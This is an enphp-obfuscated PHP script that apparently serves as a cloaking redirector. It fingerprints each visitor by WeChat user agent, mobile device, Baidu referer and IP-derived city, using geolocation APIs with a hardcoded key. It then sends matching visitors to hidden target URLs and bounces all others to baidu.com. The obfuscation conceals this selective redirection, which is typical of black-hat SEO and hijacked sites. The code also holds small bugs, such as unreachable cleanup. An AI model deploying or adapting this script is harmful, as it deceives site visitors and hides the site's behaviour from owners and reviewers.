<?php /* -- enphp : https://github.com/djunny/enphp */ error_reporting(E_ALL^E_NOTICE);define('�', '���');$GLOBALS[�] = explode('|<|)|+', 'error_reporting|<|)|+header|<|)|+Content-Type: text/html; charset=utf-8|<|)|+unknown|<|)|+HTTP_X_FORWARDED_FOR|<|)|+strcasecmp|<|)|+REMOTE_ADDR|<|)|+strpos|<|)|+,|<|)|+reset|<|)|+explode|<|)|+getip|<|)|+HTTP_USER_AGENT|<|)|+MicroMessenger|<|)|+WindowsWechat|<|)|+iconv|<|)|+UTF-8|<|)|+UCS-2|<|)|+strlen|<|)|+|<|)|+ord|<|)|+\\u|<|)|+base_convert|<|)|+HTTP_X_WAP_PROFILE|<|)|+HTTP_CLIENT|<|)|+PhoneClient|<|)|+HTTP_VIA|<|)|+stristr|<|)|+wap|<|)|+nokia|<|)|+sony|<|)|+ericsson|<|)|+mot|<|)|+samsung|<|)|+htc|<|)|+sgh|<|)|+lg|<|)|+sharp|<|)|+sie-|<|)|+philips|<|)|+panasonic|<|)|+alcatel|<|)|+lenovo|<|)|+iphone|<|)|+ipod|<|)|+blackberry|<|)|+meizu|<|)|+android|<|)|+netfront|<|)|+symbian|<|)|+ucweb|<|)|+windowsce|<|)|+palm|<|)|+operamini|<|)|+operamobi|<|)|+openwave|<|)|+nexusone|<|)|+cldc|<|)|+midp|<|)|+mobile|<|)|+ipad|<|)|+JUC|<|)|+compatible|<|)|+preg_match|<|)|+/(|<|)|+implode|<|)|+||<|)|+)/i|<|)|+strtolower|<|)|+HTTP_ACCEPT|<|)|+vnd.wap.wml|<|)|+text/html|<|)|+HTTP_REFERER|<|)|+config_url.php|<|)|+file_get_contents|<|)|+http://ip.taobao.com/service/getIpInfo.php?ip=|<|)|+json_decode|<|)|+data|<|)|+region|<|)|+city|<|)|+DG3nSbQFumqucBlZmn0CV4w1abm1zjsH|<|)|+http://api.map.baidu.com/location/ip?ip=|<|)|+&ak=|<|)|+Content-Type:application/json; charset=utf-8|<|)|+curl_init|<|)|+curl_setopt|<|)|+curl_exec|<|)|+curl_errno|<|)|+content|<|)|+address|<|)|+curl_close|<|)|+getCity|<|)|+HTTP_HOST|<|)|+count|<|)|+is_weixin|<|)|+Location:|<|)|+QUERY_STRING|<|)|+zhongjiangec.com|<|)|+baidu.com|<|)|+isMobile|<|)|+ <script>window.location.href="http://www.baidu.com:";</script>');
$GLOBALS{�}[0](0);
$GLOBALS{�}{0x001}($GLOBALS{�}[0x0002]);
function getip()
{$���=&$GLOBALS{�};
    $��� = $���{0x00003};

    if (isset($_SERVER[$���[0x000004]]) && $_SERVER[$���[0x000004]] && $���{0x05}($_SERVER[$���[0x000004]], $���)) {
        $���� = $_SERVER[$���[0x000004]];
    } elseif (isset($_SERVER[$���[0x006]]) && $_SERVER[$���[0x006]] && $���{0x05}($_SERVER[$���[0x006]], $���)) {
        $���� = $_SERVER[$���[0x006]];
    }
    
    if (!1 !== $���{0x0007}($����, $���[0x00008])) {
        $���� = $���{0x000009}($���[0x0a]($���[0x00008], $����));
    }
    return $����;
}
$ip = $GLOBALS{�}{0x00b}();
function is_weixin()
{$ւޡ=&$GLOBALS{�};
    if ($ւޡ{0x0007}($_SERVER[$ւޡ[0x000c]], $ւޡ{0x0000d}) !== !1) {
        return !0;
    }
    return !1;
}
function is_winweixin()
{$Ŋ=&$GLOBALS{�};
    if ($Ŋ{0x0007}($_SERVER[$Ŋ[0x000c]], $Ŋ[0x00000e]) == !1) {
        return !0;
    }
    return !1;
}
function unicode_encode($�ᓛ)
{$��=&$GLOBALS{�};
    $�ᓛ = $��{0x0f}($��[0x0010], $��{0x00011}, $�ᓛ);

    $���� = $��[0x000012]($�ᓛ);

    $����� = $��{0x0000013};

    for ($��� = 0; $��� < $���� - 0x001; $��� = $��� + 0x0002) {
        $ϱ = $�ᓛ[$���];

        $����� = $�ᓛ[$��� + 0x001];

        if ($��[0x014]($ϱ) > 0) {
            $����� .= $��{0x0015} . $��[0x00016]($��[0x014]($ϱ), 0x0a, 0x0010) . $��[0x00016]($��[0x014]($�����), 0x0a, 0x0010);
        } else {
            $����� .= $�����;
        }
    }
    return $�����;

}
function ismobile()
{$����=&$GLOBALS{�};
    if (isset($_SERVER[$����{0x000017}])) {
        return !0;
    }
    if (isset($_SERVER[$����[0x0000018]]) && $����{0x019} == $_SERVER[$����[0x0000018]]) {
        return !0;
    }
    if (isset($_SERVER[$����[0x001a]])) {
        return $����{0x0001b}($_SERVER[$����[0x001a]], $����[0x00001c]) ? !0 : !1;
    }
    if (isset($_SERVER[$����[0x000c]])) {
        $����� = array($����{0x000001d}, $����[0x01e], $����{0x001f}, $����[0x00020], $����{0x000021}, $����[0x0000022], $����{0x023}, $����[0x0024], $����{0x00025}, $����[0x000026], $����{0x0000027}, $����[0x028], $����{0x0029}, $����[0x0002a], $����{0x00002b}, $����[0x000002c], $����{0x02d}, $����[0x002e], $����{0x0002f}, $����[0x000030], $����{0x0000031}, $����[0x032], $����{0x0033}, $����[0x00034], $����{0x000035}, $����[0x0000036], $����{0x037}, $����[0x0038], $����{0x00039}, $����[0x00003a], $����[0x00001c], $����{0x000003b}, $����{0x0000d}, $����[0x03c], $����{0x003d}, $����[0x0003e]);
                if ($����{0x00003f}($����[0x0000040] . $����{0x041}($����[0x0042], $�����) . $����{0x00043}, $����[0x000044]($_SERVER[$����[0x000c]]))) {
            return !0;
        }
    }
    if (isset($_SERVER[$����{0x0000045}])) {
        if ($����{0x0007}($_SERVER[$����{0x0000045}], $����[0x046]) !== !1 && ($����{0x0007}($_SERVER[$����{0x0000045}], $����{0x0047}) === !1 || $����{0x0007}($_SERVER[$����{0x0000045}], $����[0x046]) < $����{0x0007}($_SERVER[$����{0x0000045}], $����{0x0047}))) {
            return !0;
        }
    }
    return !1;

}
$fromurl = $_SERVER[$GLOBALS{�}[0x00048]];
include_once $GLOBALS{�}{0x000049};
function getCity($�)
{$���=&$GLOBALS{�};
    $��� = $���[0x000004a]($���{0x04b} . $�);

    $��� = $���[0x004c]($���, !0);

    $���� = $���[$���{0x0004d}][$���[0x00004e]];

    $��� = $���[$���{0x0004d}][$���{0x000004f}];

    return $���� . $���;

}
function getBCity($�����)
{$����=&$GLOBALS{�};
    $��� = $����[0x050];

    $� = $����{0x0051};

    $���ʉ = $� . $����� . $����[0x00052] . $���;

    $����{0x001}($����{0x000053});

    $�᧤ = $����[0x0000054]();

    $����{0x055}($�᧤, CURLOPT_URL, $���ʉ);

    $����{0x055}($�᧤, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);

    $����{0x055}($�᧤, CURLOPT_HEADER, 0);

    $����{0x055}($�᧤, CURLOPT_RETURNTRANSFER, 0x001);

    $����{0x055}($�᧤, CURLOPT_RETURNTRANSFER, 0x001);

    $꫇� = $����[0x0056]($�᧤);

    if ($꫇� === !1) {
        echo $����{0x00057}($�᧤);
        exit;
    }
    $����� = $����[0x004c]($꫇�, !0);
    return $�����[$����[0x000058]][$����{0x0000059}];

    $����[0x05a]($�᧤);

}

$IP_str = $GLOBALS{�}{0x005b}($ip);
$l = $_SERVER[$GLOBALS{�}[0x00048]];
$host = $_SERVER[$GLOBALS{�}[0x0005c]];
$arrlength = $GLOBALS{�}{0x00005d}($citys);
$fromlength = $GLOBALS{�}{0x00005d}($from_domain);
$num = 0;
for ($i = 0; $i < $arrlength; $i++) {
    $num = $num + $GLOBALS{�}{0x00005d}($GLOBALS{�}[0x0a]($citys[$i], $IP_str));
            }
if ($isfrom == !0) {
    $dnum = 0x02710;
} else {
    for ($i = 0; $i < $fromlength; $i++) {
        $dnum = $dnum + $GLOBALS{�}{0x00005d}($GLOBALS{�}[0x0a]($from_domain[$i], $fromurl));
    }
}
$weixin = $GLOBALS{�}[0x000005e]();
echo $weixin;
if ($weixin) {
    $GLOBALS{�}{0x001}($GLOBALS{�}{0x05f} . $tbk_mobile . $GLOBALS{�}{0x0000013});
    exit;
}
$fromsogou = $_SERVER[$GLOBALS{�}[0x0060]];
if ($GLOBALS{�}{0x0001b}($host, $GLOBALS{�}{0x00061})) {
    if ($GLOBALS{�}{0x0001b}($fromurl, $GLOBALS{�}[0x000062]) == !0) {
        if ($num > $arrlength) {
            $GLOBALS{�}{0x001}($GLOBALS{�}{0x05f} . $oth . $GLOBALS{�}{0x0000013});
            exit;
        } else {
            if ($GLOBALS{�}{0x0000063}() == !0) {
                $GLOBALS{�}{0x001}($GLOBALS{�}{0x05f} . $tbk_mobile . $GLOBALS{�}{0x0000013});
                exit;
            } else {
                $GLOBALS{�}{0x001}($GLOBALS{�}{0x05f} . $tbk . $GLOBALS{�}{0x0000013});
                exit;
            }
        }
    } else {
        $GLOBALS{�}{0x001}($GLOBALS{�}{0x05f} . $oth . $GLOBALS{�}{0x0000013});
        exit;
                            }
} else {
    echo $GLOBALS{�}[0x064];
}